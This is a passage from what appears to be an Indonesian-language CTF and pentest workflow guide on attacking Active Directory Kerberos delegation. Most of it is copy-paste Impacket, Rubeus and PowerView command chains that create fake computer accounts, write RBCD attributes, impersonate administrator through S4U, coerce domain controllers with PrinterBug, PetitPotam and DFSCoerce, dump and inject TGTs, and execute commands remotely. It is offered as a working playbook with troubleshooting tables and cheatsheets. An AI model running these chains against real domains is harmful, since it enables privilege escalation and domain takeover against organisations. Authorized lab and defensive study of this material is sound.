    -impersonate "$IMPERSONATE" \
    -dc-ip "$DC_IP"
```

Contoh output:

```text
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

---

# 3.5.7 🗂️ Step 5 — Gunakan Ticket

```bash
# Switch ke ticket hasil S4U
export KRB5CCNAME="administrator.ccache"

# Verifikasi
klist
```

Contoh:

```text
Client: administrator @ DOMAIN.LOCAL
Server: CIFS/targetcomputer.domain.local @ DOMAIN.LOCAL
```

---

# 3.5.8 💻 Step 6 — Access Target

SMB:

```bash
# Akses SMB sebagai administrator
python3 /opt/impacket/examples/smbclient.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@targetcomputer.domain.local"
```

Remote execution:

```bash
# WMI execution menggunakan Kerberos ticket
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@targetcomputer.domain.local"
```

Contoh:

```text
[*] SMB target: targetcomputer.domain.local
[*] Using Kerberos authentication
[*] AUTHENTICATED
```

---

# 3.6 🪟 RBCD dengan PowerView + Rubeus

Pada Windows lab:

```powershell
# Fake machine password
$FAKEPASS = ConvertTo-SecureString `
    "FakePass123!" `
    -AsPlainText `
    -Force

# Buat machine account
New-MachineAccount `
    -MachineAccount "FAKECOMPUTER" `
    -Password $FAKEPASS `
    -Domain "domain.local" `
    -DomainController $DC_IP
```

Ambil SID:

```powershell
# Ambil SID computer account
$ComputerSid = Get-DomainComputer FAKECOMPUTER `
    -Properties objectsid |
    Select-Object -ExpandProperty objectsid
```

Buat security descriptor:

```powershell
# Buat security descriptor yang memberikan
# hak delegation kepada fake computer
$SD = New-Object `
    Security.AccessControl.RawSecurityDescriptor `
    -ArgumentList `
    "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"

# Convert descriptor menjadi bytes
$SDBytes = New-Object byte[] ($SD.BinaryLength)

# Serialize descriptor
$SD.GetBinaryForm($SDBytes,0)
```

Set attribute:

```powershell
# Target computer object
Get-DomainComputer TARGETCOMPUTER |
    Set-DomainObject `
        -Set @{
            'msds-allowedtoactonbehalfofotheridentity'=$SDBytes
        }
```

S4U:

```powershell
# Impersonate Administrator ke target
.\Rubeus.exe s4u `
    /user:FAKECOMPUTER$ `
    /password:FakePass123! `
    /impersonateuser:administrator `
    /msdsspn:CIFS/targetcomputer.domain.local `
    /ptt
```

Verifikasi:

```powershell
# Ticket harus muncul
klist
```

---

# 3.7 🧹 Cleanup RBCD

Pada real pentest, perubahan AD harus dikembalikan bila engagement mengharuskannya.

Flush:

```bash
# Hapus RBCD configuration dari target
python3 /opt/impacket/examples/rbcd.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -action flush \
    -delegate-to "$TARGET" \
    -dc-ip "$DC_IP"
```

Contoh:

```text
[*] Attribute cleared successfully
```

Jika fake computer dibuat khusus untuk lab:

```bash
# Hapus machine account sesuai dukungan versi addcomputer.py
python3 /opt/impacket/examples/addcomputer.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -method LDAPS \
    -computer-name "$FAKECOMPUTER" \
    -computer-pass "$FAKEPASS" \
    -dc-ip "$DC_IP" \
    -delete
```

> Pada CTF biasanya cleanup opsional. Pada pentest sebenarnya, perubahan directory harus didokumentasikan dan ditangani sesuai rules of engagement.

---

# 🧲 4. Printer Bug / Coercion Attacks

## 4.1 🧠 Apa Itu Coercion?

Unconstrained delegation membutuhkan sesuatu untuk terjadi:

```text
PRIVILEGED USER / DC
        │
        │ authenticate
        ▼
UNCONSTRAINED COMPUTER
```

Masalah attacker:

> Bagaimana membuat DC melakukan authentication ke komputer tersebut?

Jawabannya bisa berupa **coercion technique**.

Konsep:

```text
ATTACKER
   │
   │ trigger
   ▼
DC
   │
   │ forced authentication
   ▼
UNCONSTRAINED COMPUTER
   │
   ▼
TGT / authentication material
```

---

# 4.2 🖨️ PrinterBug / SpoolSample

Windows Print Spooler dapat menjadi salah satu primitive coercion dalam environment tertentu.

Cek RPC:

```bash
# Periksa RPC endpoint terkait spooler
python3 /opt/impacket/examples/rpcdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" |
    grep -i "spool"
```

Contoh:

```text
MS-RPRN
spoolss
```

Trigger tool-specific:

```bash
# Instalasi PrinterBug (opsional)
# Clone repo yang menyediakan tool ini (pilih salah satu)
#   git clone https://github.com/dirkjanm/krbrelayx.git /opt/krbrelayx
#   atau
#   git clone https://github.com/NotMedic/NetNTLMtoSilverTicket.git /opt/NetNTLMtoSilverTicket
# Atau instal Impacket yang sudah menyertakan printerbug (jika tersedia)
#   pip3 install impacket
# Pastikan script tersedia, contoh path:
#   /opt/krbrelayx/examples/printerbug.py
#
# Contoh syntax PrinterBug implementation
python3 /opt/tools/printerbug/printerbug.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    "$TARGET"
```

> Tool dan syntax PrinterBug berbeda-beda. Gunakan `-h` pada implementation yang terpasang.

---

# 4.3 🧲 PetitPotam

PetitPotam menggunakan coercion melalui protocol Windows tertentu.

Contoh:

```bash
# DC akan dipaksa mencoba authentication
# terhadap listener/target yang ditentukan
python3 /opt/PetitPotam/PetitPotam.py \
    "$TARGET" \
    "$DC_IP"
```

Dengan credential pada implementation yang mendukung opsi tersebut:

```bash
# Contoh authenticated coercion
python3 /opt/PetitPotam/PetitPotam.py \
    -d "$DOMAIN" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    "$TARGET" \
    "$DC_IP"
```

> PetitPotam telah memiliki mitigasi/patch dan hasilnya sangat bergantung pada konfigurasi Windows/AD. Jangan menganggap teknik ini selalu berhasil.

---

# 4.4 🌀 DFSCoerce

Alternative coercion primitive:

```bash
# Trigger DFS-related authentication
python3 /opt/DFSCoerce/dfscoerce.py \
    -d "$DOMAIN" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    "$TARGET" \
    "$DC_IP"
```

Attack chain:

```text
DFSCoerce
    │
    ▼
DC authentication
    │
    ▼
Unconstrained computer
    │
    ▼
TGT
```

---

# 4.5 ⚠️ Coercion Tidak Sama dengan Relay

Ini konsep yang sangat penting.

Coercion:

```text
DC
 │
 └── dipaksa authenticate
```

Delegation:

```text
Authentication
 │
 └── dimanfaatkan melalui delegation
```

Relay:

```text
Authentication
 │
 └── diteruskan ke service lain
```

Mereka dapat berada dalam attack chain yang berbeda:

```text
             ┌── Delegation
Coercion ────┤
             └── NTLM Relay
```

Lihat:

→ [**File 41: NTLM Relay**](https://chatgpt.com/41-ntlm-relay/<a href="/docs/ntlm-relay" class="text-[#00b4d8] hover:underline font-mono font-semibold">41_ntlm_relay_workflow.md</a>)

---

# 🔎 5. Delegation Enumeration Master

## 5.1 🚀 One-Command Enumeration

Set variable:

```bash
# Domain Controller
DC_IP="10.10.10.10"

# Domain
DOMAIN="domain.local"

# Username
USERNAME="username"

# Password
PASSWORD="password"
```

Enumerate:

```bash
# Semua delegation yang dapat ditemukan Impacket
python3 /opt/impacket/examples/findDelegation.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"
```

Filter:

```bash
# Fokus unconstrained
python3 /opt/impacket/examples/findDelegation.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP" |
    grep -i "Unconstrained"
```

```bash
# Fokus constrained
python3 /opt/impacket/examples/findDelegation.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP" |
    grep -i "Constrained"
```

> RBCD tidak selalu dapat ditemukan dengan `findDelegation.py` sebagai daftar delegation biasa. RBCD sebaiknya dianalisis melalui computer-object ACL/attribute dan BloodHound.

---

## 5.2 🧭 RBCD Enumeration

Pertanyaan pertama:

```text
WHO
 │
 └── memiliki GenericWrite / WriteDACL / GenericAll
        │
        ▼
COMPUTER OBJECT
```

BloodHound:

```cypher
MATCH p=(u)-[r:GenericWrite|WriteDacl|GenericAll]->(c:Computer)
WHERE NOT u.name ENDS WITH '$'
RETURN u.name,c.name,type(r)
```

Output:

```text
lowpriv@DOMAIN.LOCAL
        │
        └── GenericWrite
                 │
                 ▼
             TARGET01$
```

Itu adalah kandidat RBCD.

---

# 🩸 5.3 BloodHound Delegation Queries

### Unconstrained

```cypher
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name,c.operatingsystem
```

### Constrained

```cypher
MATCH (u)-[:AllowedToDelegate]->(target)
RETURN u.name,target.name
```

### GenericWrite → Computer

```cypher
MATCH p=(u)-[r:GenericWrite]->(c:Computer)
RETURN u.name,c.name
```

### WriteDACL → Computer

```cypher
MATCH p=(u)-[r:WriteDacl]->(c:Computer)
RETURN u.name,c.name
```

### GenericAll → Computer

```cypher
MATCH p=(u)-[r:GenericAll]->(c:Computer)
RETURN u.name,c.name
```

---

# 🌳 6. Delegation Attack Decision Tree

```text
                    ┌──────────────────────┐
                    │      ENUMERATION     │
                    └──────────┬───────────┘
                               │
                               ▼
                    findDelegation / BH
                               │
              ┌────────────────┼─────────────────┐
              │                │                 │
              ▼                ▼                 ▼
       UNCONSTRAINED       CONSTRAINED          RBCD
              │                │                 │
              │                │                 │
              ▼                ▼                 ▼
       Can compromise?   Protocol Transition?  Write access?
              │                │                 │
        ┌─────┴─────┐    ┌─────┴─────┐     ┌────┴─────┐
        │           │    │           │     │          │
       YES          NO  YES          NO   YES         NO
        │           │    │           │     │          │
        ▼           ▼    ▼           ▼     ▼          ▼
     Monitor     Compromise     S4U2Self   Need     Create/Use  Check
       TGT          host           +       TGS      FakeComputer other ACL
        │                         S4U2Proxy  │
        ▼                              │     ▼
     Coercion                          │   S4U2Proxy
        │                              │     │
        ▼                              │     ▼
      Dump TGT                         │   Target
        │                              │
        ▼                              │
       PTT                             │
        │                              │
        ▼                              │
   Privilege escalation                │
```

---

## 6.1 🔴 Jika Unconstrained Ditemukan

```text
Unconstrained?
     │
    YES
     │
     ▼
Can I access the computer?
     │
 ┌───┴────┐
 YES      NO
 │         │
 ▼         ▼
Monitor   Find initial
tickets   access path
 │
 ▼
Can I trigger authentication?
 │
 ▼
Coercion
 │
 ▼
TGT
 │
 ▼
Check privilege
 │
 ▼
PTT / appropriate access
```

---

## 6.2 🟠 Jika Constrained Ditemukan

```text
Constrained?
     │
    YES
     │
     ▼
Check msDS-AllowedToDelegateTo
     │
     ▼
Protocol Transition?
     │
 ┌───┴────┐
 YES      NO
 │         │
 ▼         ▼
S4U2Self  Need appropriate
 │        user TGS/authentication
 ▼
S4U2Proxy
 │
 ▼
Allowed SPN
 │
 ▼
Target access
```

---

## 6.3 🟣 Jika RBCD Ditemukan

```text
Can I write target computer object?
             │
        ┌────┴────┐
       YES        NO
        │          │
        ▼          ▼
 Check MAQ       Search other ACL
        │
   ┌────┴────┐
  >0         0
   │          │
   ▼          ▼
Create      Find existing
computer    computer account
   │          │
   └────┬─────┘
        ▼
Write RBCD
        │
        ▼
S4U2Self
        │
        ▼
S4U2Proxy
        │
        ▼
Target service
```

---

# 🧪 7. Common Errors & Troubleshooting

|Error|Kemungkinan Penyebab|Pemeriksaan / Solusi|
|---|---|---|
|`KDC_ERR_BADOPTION`|KDC menolak option delegation|Periksa delegation configuration dan SPN|
|`KRB_AP_ERR_SKEW`|Clock terlalu berbeda|Sinkronkan waktu attacker dengan DC|
|`KDC_ERR_PADATA_TYPE_NOSUPP`|Authentication method/encryption/protocol tidak didukung|Periksa metode credential dan konfigurasi domain|
|`KDC_ERR_S_PRINCIPAL_UNKNOWN`|SPN tidak ditemukan|Cek hostname dan SPN|
|`KDC_ERR_C_PRINCIPAL_UNKNOWN`|Client principal tidak ditemukan|Cek username/domain|
|`KRB_AP_ERR_MODIFIED`|SPN/key mismatch|Cek duplicate/misconfigured SPN|
|`KRB_AP_ERR_TKT_EXPIRED`|Ticket expired|Request TGT/TGS baru|
|`KDC_ERR_PREAUTH_FAILED`|Credential/key salah|Verifikasi password/hash|
|`KDC_ERR_CLIENT_REVOKED`|Account disabled/restricted|Cek status account|
|`KDC_ERR_POLICY`|AD policy menolak request|Cek delegation/protected account policy|
|`Access is denied` setelah PTT|Ticket benar tetapi tidak punya authorization|Verifikasi identity dan target ACL|
|`rbcd.py permission denied`|Tidak memiliki write permission|Cek GenericWrite/WriteDACL/GenericAll|
|`addcomputer.py` gagal|MAQ 0 atau creation restriction|Gunakan existing controlled computer account|
|Fake computer tidak terlihat|Replication delay / wrong OU/query|Query ulang LDAP/BloodHound|
|`getST.py` gagal S4U2Proxy|Delegation/SPN tidak sesuai|Periksa `msDS-AllowedToDelegateTo` dan target SPN|
|`getTGT.py` gagal|Password/hash salah|Validasi credential|
|`klist` kosong|Ticket tidak masuk cache/session|Set `KRB5CCNAME` atau gunakan `/ptt`|
|`SMB` gagal setelah S4U|SPN/service mismatch|Coba SPN service yang benar|
|`Clock skew too great`|Time difference|Sinkronisasi waktu dengan DC|
|LDAP bind gagal|DN/password salah atau LDAP policy|Cek bind DN dan channel/security requirement|
|RBCD attribute kosong|Write tidak berhasil|Baca ulang attribute dan cek ACL|
|`KRB_AP_ERR_USER_TO_USER_REQUIRED`|Service membutuhkan user-to-user authentication|Gunakan service/flow yang sesuai|
|Ticket valid tetapi target menolak|Authorization target tidak sesuai|Ingat authentication ≠ authorization|

---

## 7.1 ⏰ Clock Skew

Kerberos sangat sensitif terhadap waktu.

Check:

```bash
# Waktu attacker
date

# Waktu DC
```bash
# Alternatif 1 – rdate
sudo rdate -n "$DC_IP"

# Alternatif 2 – timedatectl (systemd)
sudo timedatectl set-ntp false
sudo date -s "$(curl -s --head $DC_IP | grep Date | cut -d' ' -f2-)"
sudo timedatectl set-ntp true

# Alternatif 3 – faketime / chronyd (lab)
sudo apt install libfaketime -y
faketime "$(ntpdate -q $DC_IP | grep offset | awk '{print $5}')" python3 getST.py ...

# Simpler fallback for CTF
sudo ntpdate -u "$DC_IP" 2>/dev/null || sudo chronyd -q "server $DC_IP iburst"
```

Mindset:

```text
Kerberos Error
     │
     ▼
Check time FIRST
```

---

## 7.2 🎫 `klist` Tidak Menunjukkan Ticket

Linux:

```bash
# Periksa environment
echo "$KRB5CCNAME"

# Periksa ticket cache
klist
```

Jika kosong:

```bash
# Pastikan cache menunjuk file yang benar
export KRB5CCNAME="$PWD/administrator.ccache"

# Coba lagi
klist
```

Windows:

```powershell
# List Kerberos tickets
klist
```

---

## 7.3 🌐 SPN Salah

Contoh:

```text
CIFS/fileserver.domain.local
```

berbeda dengan:

```text
CIFS/10.10.10.20
```

Untuk troubleshooting:

```text
TARGET HOSTNAME
      │
      ▼
fileserver.domain.local
      │
      ├── CIFS
      ├── HOST
      └── HTTP
```

Cari SPN:

```powershell
# Query SPN computer
setspn -L FILESERVER
```

---

# 📏 8. Golden Rules Delegation

## Rule 1 — 🔴 Unconstrained = Jackpot Potential

```text
Compromise unconstrained host
        +
Privileged authentication
        =
Potential TGT capture
```

Tetapi:

> **Potential ≠ guaranteed Domain Admin.**

Privilege ticket harus tetap dianalisis.

---

## Rule 2 — 🟣 Selalu Cek MachineAccountQuota

Jangan berasumsi:

```text
low privilege = tidak bisa buat computer
```

Periksa:

```text
ms-DS-MachineAccountQuota
```

---

## Rule 3 — 🧲 Coercion Membutuhkan Jalur Network

```text
DC
 │
 └── authentication
       │
       ▼
Attacker-controlled host
```

Jika DC tidak dapat mencapai target:

```text
DC ──X──> attacker
```

coercion chain dapat gagal.

---

## Rule 4 — ⏰ Clock Sync Wajib

```text
Kerberos
   │
   └── sensitive terhadap timestamp
```

Jika:

```text
Attacker time ≠ DC time
```

maka berbagai operasi Kerberos dapat gagal.

---

## Rule 5 — 🧹 Cleanup

Jika mengubah:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

dalam real pentest:

```text
document
   │
   ▼
restore
   │
   ▼
verify
```

---

## Rule 6 — 🟠 Protocol Transition Sangat Penting

Jika:

```text
TrustedToAuthForDelegation
```

tersedia, S4U2Self dapat menjadi bagian dari attack chain tanpa password user target.

---

## Rule 7 — 🩸 BloodHound Mempercepat Analisis

Daripada melihat object satu per satu:

```text
ACL
 │
 ▼
BloodHound graph
 │
 ▼
Attack path
```

---

## Rule 8 — 🎟️ `.ccache` Bisa Menjadi Pivot

Output:

```text
administrator.ccache
```

dapat menjadi input untuk tool Kerberos-aware lain:

```bash
export KRB5CCNAME="administrator.ccache"
```

---

## Rule 9 — 🔄 Jangan Asumsikan SPN Substitution

SPN substitution kadang membantu:

```text
HTTP
 ↓
HOST
 ↓
CIFS
```

tetapi keberhasilan tergantung environment.

Selalu validate.

---

## Rule 10 — 🛡️ Protected Accounts Harus Diperhatikan

Account dengan security restriction tertentu dapat memblokir delegation atau membuat ticket flow berbeda.

Jangan hanya melihat:

```text
"Administrator"
```

tetapi juga:

```text
Protected Users
Account restrictions
Delegation flags
Ticket properties
```

---

# 🧠 9. Delegation Cheatsheet

## 9.1 🔎 Enumeration — 3 Commands

```bash
# [1] Enumerate delegation
python3 /opt/impacket/examples/findDelegation.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"

# [2] Check MachineAccountQuota
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "CN=$USERNAME,CN=Users,DC=domain,DC=local" \
    -w "$PASSWORD" \
    -b "DC=domain,DC=local" \
    "(objectClass=domain)" \
    ms-DS-MachineAccountQuota

# [3] Enumerate computer ACL candidates with BloodHound
# GenericWrite / WriteDACL / GenericAll → computer
```

---

# 9.2 🔴 Unconstrained Exploitation — 4 Commands

```powershell
# [1] Monitor TGT
.\Rubeus.exe monitor /interval:5 /nowrap

# [2] Trigger/coerce authentication
# Gunakan coercion tool yang sesuai dengan lab

# [3] Dump tickets
.\Rubeus.exe dump /nowrap

# [4] Inject captured ticket
.\Rubeus.exe ptt /ticket:BASE64_TICKET
```

---

# 9.3 🟠 Constrained Exploitation — 4 Commands

```powershell
# [1] S4U2Self + S4U2Proxy
.\Rubeus.exe s4u `
    /user:$USERNAME `
    /password:$PASSWORD `
    /impersonateuser:administrator `
    /msdsspn:CIFS/$TARGET `
    /ptt

# [2] Verify ticket
klist
```

```bash
# [3] Alternative: request TGT with Impacket
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP"

# [4] Request S4U ticket
export KRB5CCNAME="$USERNAME.ccache"

python3 /opt/impacket/examples/getST.py \
    "$DOMAIN/$USERNAME" \
    -k -no-pass \
    -spn "CIFS/$TARGET" \
    -impersonate administrator \
    -dc-ip "$DC_IP"
```

---

# 9.4 🟣 RBCD Full Chain — 6 Commands

```bash
# [1] Create fake computer
python3 /opt/impacket/examples/addcomputer.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -method LDAPS \
    -computer-name "FAKECOMPUTER$" \
    -computer-pass "FakePass123!" \
    -dc-ip "$DC_IP"
```

```bash
# [2] Write RBCD
python3 /opt/impacket/examples/rbcd.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -action write \
    -delegate-to "$TARGET" \
    -delegate-from "FAKECOMPUTER$" \
    -dc-ip "$DC_IP"
```

```bash
# [3] Get TGT fake computer
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/FAKECOMPUTER$:FakePass123!" \
    -dc-ip "$DC_IP"
```

```bash
# [4] Set ticket cache
export KRB5CCNAME="FAKECOMPUTER\$.ccache"
```

```bash
# [5] S4U2Self + S4U2Proxy
python3 /opt/impacket/examples/getST.py \
    "$DOMAIN/FAKECOMPUTER$" \
    -k -no-pass \
    -spn "CIFS/$TARGET" \
    -impersonate administrator \
    -dc-ip "$DC_IP"
```

```bash
# [6] Use resulting ticket
export KRB5CCNAME="administrator.ccache"

python3 /opt/impacket/examples/smbclient.py \
    -k -no-pass \
    "$DOMAIN/administrator@$TARGET"
```

---

# 9.5 🧲 Coercion — 2 Commands

```bash
# PrinterBug / MS-RPRN-style coercion
python3 /opt/tools/printerbug/printerbug.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    "$TARGET"
```

```bash
# PetitPotam
python3 /opt/PetitPotam/PetitPotam.py \
    "$TARGET" \
    "$DC_IP"
```

> Syntax bergantung pada implementation yang terpasang. Selalu jalankan `-h` jika syntax berbeda.

---

# 🗺️ 10. Cross-Workflow Links

## ← File 38 — AD ACL Abuse

Delegation dan ACL sangat erat hubungannya.

Contoh:

```text
GenericWrite
     │
     ▼
Computer Object
     │
     ▼
RBCD
     │
     ▼
S4U
     │
     ▼
Privilege Escalation
```

← [**File 38: AD ACL Abuse**](https://chatgpt.com/38-ad-acl-abuse/[🔐 File 38 — Active Directory ACL Abuse Workflow](/docs/ad-acl-abuse))

**Muscle memory:**

> Jika BloodHound menunjukkan `GenericWrite → Computer`, jangan hanya berpikir "ACL abuse". Langsung tanyakan: **apakah computer object tersebut kandidat RBCD?**

---

## ← File 37 — Kerberoasting & AS-REP Roasting

S4U merupakan extension dari Kerberos service-for-user mechanisms.

Mental model:

```text
File 37
   │
   ├── TGT
   ├── TGS
   ├── SPN
   └── Kerberos
          │
          ▼
File 39
   │
   ├── S4U2Self
   ├── S4U2Proxy
   ├── Delegation
   └── RBCD
```

← [**File 37: Kerberoasting & AS-REP Roasting**](https://chatgpt.com/37-kerberoasting-asrep-roasting/[🔥 Workflow 37 — Kerberoasting & AS-REP Roasting](/docs/kerberoasting-asreproasting))

---

## → File 40 — AD CS

Delegation bukan satu-satunya jalan privilege escalation.

Setelah delegation tidak memberikan path:

```text
Delegation
    │
    └── no viable path
             │
             ▼
          AD CS
```

→ [**File 40: AD CS**](https://chatgpt.com/40-adcs/<a href="/docs/adcs" class="text-[#00b4d8] hover:underline font-mono font-semibold">40_adcs_workflow.md</a>)

---

## → File 41 — NTLM Relay

Coercion dapat menjadi primitive untuk attack chain lain:

```text
DC
 │
 │ coercion
 ▼
Attacker
 │
 │ NTLM authentication
 ▼
Relay
 │
 ▼
Vulnerable Service
```

Jadi:

```text
Coercion
   ├──→ Delegation
   │
   └──→ NTLM Relay
```

→ [**File 41: NTLM Relay**](https://chatgpt.com/41-ntlm-relay/<a href="/docs/ntlm-relay" class="text-[#00b4d8] hover:underline font-mono font-semibold">41_ntlm_relay_workflow.md</a>)

---

## → File 43 — Domain Persistence

Delegation dapat menghasilkan:

```text
Privileged access
       │
       ▼
Domain compromise
       │
       ▼
Persistence analysis
```

Setelah mendapatkan privileged access dalam CTF:

```text
Delegation
    │
    ▼
DA / equivalent privilege
    │
    ▼
Persistence
```

→ [**File 43: Domain Persistence**](https://chatgpt.com/43-domain-persistence/<a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>)

---

# 🧠 11. Final Mental Model

Jangan menghafal puluhan command secara terpisah.

Hafalkan **hubungan antar-objek**.

```text
                    KERBEROS
                       │
          ┌────────────┼────────────┐
          │            │            │
         TGT          TGS           SPN
          │            │            │
          └────────────┼────────────┘
                       │
                       ▼
                  DELEGATION
                       │
          ┌────────────┼────────────┐
          │            │            │
          ▼            ▼            ▼
    UNCONSTRAINED  CONSTRAINED     RBCD
          │            │            │
          │            │            │
          ▼            ▼            ▼
      Capture       S4U2Self      Write ACL
        TGT             │            │
          │             ▼            ▼
          ▼         S4U2Proxy    Fake Computer
       PTT               │            │
          │              │            ▼
          ▼              │         S4U2Self
    Privileged           │            │
       access            │            ▼
                         │         S4U2Proxy
                         │            │
                         └─────┬──────┘
                               ▼
                         Target Service
```

---

# 🎯 12. CTF Muscle Memory

Ketika mendapatkan shell/credential pada domain, gunakan urutan berikut:

```text
1. ENUMERATE
      │
      ▼
2. Ada delegation?
      │
      ├── Unconstrained
      │       │
      │       └── Can compromise host?
      │               │
      │               └── Monitor + coercion
      │
      ├── Constrained
      │       │
      │       └── Check allowed SPN
      │               │
      │               └── Protocol Transition?
      │                       │
      │                       └── S4U
      │
      └── RBCD candidate
              │
              └── GenericWrite?
                      │
                      └── Check MAQ
                              │
                              └── Fake Computer
                                      │
                                      └── RBCD
                                              │
                                              └── S4U
```

---

# 🚨 13. Checklist Sebelum Meninggalkan Delegation

```text
[ ] Apakah ada unconstrained delegation?
[ ] Apakah DC dikecualikan dari hasil analisis?
[ ] Apakah ada user/computer constrained delegation?
[ ] Apa isi msDS-AllowedToDelegateTo?
[ ] Apakah Protocol Transition aktif?
[ ] Apa SPN target?
[ ] Apakah ada RBCD?
[ ] Siapa yang memiliki GenericWrite ke computer object?
[ ] Siapa yang memiliki WriteDACL?
[ ] Siapa yang memiliki GenericAll?
[ ] Berapa MachineAccountQuota?
[ ] Apakah ada computer account yang dapat dikontrol?
[ ] Apakah target memiliki CIFS/HOST/HTTP SPN?
[ ] Apakah clock attacker sinkron dengan DC?
[ ] Apakah TGT/TGS berhasil diperoleh?
[ ] Apakah ticket masih valid?
[ ] Apakah PTT berhasil?
[ ] Apakah authentication berhasil?
[ ] Apakah authorization ke target berhasil?
[ ] Jika melakukan perubahan AD, apakah sudah cleanup?
```

---

# 🏁 14. One-Minute Summary

```text
UNCONSTRAINED
    │
    └── Compromise host
          │
          └── Privileged authentication
                │
                └── Capture TGT
                      │
                      └── PTT / appropriate privilege use


CONSTRAINED
    │
    └── Compromise delegation account
          │
          └── Check allowed SPN
                │
                └── S4U2Self
                      │
                      └── S4U2Proxy
                            │
                            └── Target service


RBCD
    │
    └── GenericWrite/WriteDACL/GenericAll
          │
          └── Target Computer
                │
                └── Create/control Computer Account
                      │
                      └── Write RBCD
                            │
                            └── S4U2Self
                                  │
                                  └── S4U2Proxy
                                        │
                                        └── Target
```

## 🧩 Golden Mental Model

> **Unconstrained = capture trust.**  
> **Constrained = use delegated trust.**  
> **RBCD = modify who the resource trusts.**

Dan pertanyaan paling penting setiap kali melihat delegation:

```text
WHO
 │
 ├── memiliki delegation?
 │
 ├── siapa yang dapat mengontrolnya?
 │
 ├── siapa yang dapat diimpersonate?
 │
 └── service mana yang dapat dituju?
```

Jika empat pertanyaan tersebut sudah terjawab, barulah pilih tool dan command.

---

# [🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export DC_IP="10.10.10.10"
export DOMAIN="corp.local"
export TARGET="10.10.10.20"       # Target machine (bukan DC)
export LHOST="10.10.14.5"         # IP tun0 kamu
export USERNAME="lowprivuser"
export PASSWORD="Password123!"

mkdir -p ~/delegation_loot/{tickets,creds,enum}
cd ~/delegation_loot

# Tambahkan DC ke /etc/hosts agar Kerberos bisa resolve
echo "$DC_IP dc01.$DOMAIN dc01 $DOMAIN" | sudo tee -a /etc/hosts

echo "[*] DC: $DC_IP | Domain: $DOMAIN | Target: $TARGET"
```

**Output yang diharapkan:**

text

```
[*] DC: 10.10.10.10 | Domain: corp.local | Target: 10.10.10.20
```

---

## ═══════════════════════════════════════

## FASE 0: KONFIRMASI CONTEXT & SINKRONISASI WAKTU

## ═══════════════════════════════════════

> **KENAPA INI PENTING:** Kerberos GAGAL jika clock beda >5 menit dari DC. Ini error paling umum yang bikin frustrasi.

### Langkah 0.1 — Sinkronisasi Waktu dengan DC (WAJIB)

Bash

```
# Command 1: Sync waktu (pilih salah satu yang works)
sudo ntpdate -u $DC_IP

# Command 2: Alternatif jika ntpdate tidak ada
sudo rdate -n $DC_IP

# Command 3: Alternatif manual
sudo date -s "$(python3 -c "
import subprocess
result = subprocess.run(['smbclient', '-N', '-L', '//$DC_IP/'], 
    capture_output=True, text=True)
" 2>/dev/null)" 2>/dev/null || echo "Manual sync needed"

# Verifikasi waktu
date
```

**OUTPUT BERHASIL ✅:**

text

```
 8 Jan 17:25:10 ntpdate[1234]: adjust time server 10.10.10.10 offset 0.001234 sec
```

**OUTPUT GAGAL ❌ — ntpdate tidak ada:**

text

```
bash: ntpdate: command not found
```

➡️ Install dulu:

Bash

```
sudo apt install ntpdate -y && sudo ntpdate -u $DC_IP
```

---

### Langkah 0.2 — Verifikasi Credentials Valid

Bash

```
# Cek credentials sebelum mulai apapun
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN"
```

**OUTPUT BERHASIL ✅:**

text

```
SMB   10.10.10.10  445  DC01  [+] corp.local\lowprivuser:Password123!
```

**OUTPUT BERHASIL ✅ — Hash based (jika punya NTLM hash):**

Bash

```
# Simpan hash kalau ada
export NTLM_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASHHERE"
nxc smb $DC_IP -u "$USERNAME" -H "$NTLM_HASH" -d "$DOMAIN"
```

**OUTPUT GAGAL ❌ — Logon failure:**

text

```
SMB   10.10.10.10  445  DC01  [-] corp.local\lowprivuser:Password123! STATUS_LOGON_FAILURE
```

➡️ Creds salah. Balik ke **[05. SMB & Samba Exploitation Workflow — Master Field Guide](/docs/smb-samba)** untuk dapat creds dulu.

---

## ═══════════════════════════════════════

## FASE 1: ENUMERATION DELEGATION (PRIORITAS UTAMA)

## ═══════════════════════════════════════

> **Tujuan:** Identifikasi tipe delegation yang ada SEBELUM exploit. Jangan tebak-tebak.

### Langkah 1.1 — One-Command Delegation Discovery

Bash

```
# Command 1: impacket findDelegation — PALING KOMPREHENSIF
python3 /opt/impacket/examples/findDelegation.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -dc-ip "$DC_IP" \
    | tee ~/delegation_loot/enum/all_delegation.txt

# Command 2: Jika impacket path berbeda
